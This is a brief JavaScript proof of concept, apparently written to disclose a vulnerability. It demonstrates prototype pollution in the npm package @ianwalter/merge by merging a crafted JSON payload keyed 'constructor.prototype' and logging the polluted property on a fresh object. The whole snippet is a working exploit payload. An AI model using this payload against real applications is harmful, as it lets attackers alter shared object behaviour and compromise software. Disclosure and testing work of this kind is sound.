Object.prototype.hasOwnProperty.call = () => true;
const merge = require('@ianwalter/merge');
console.log({}.polluted);
let EVIL_JSON = JSON.parse('{"constructor.prototype": {"polluted":"yes"}}');
merge({}, EVIL_JSON);
console.log({}.polluted);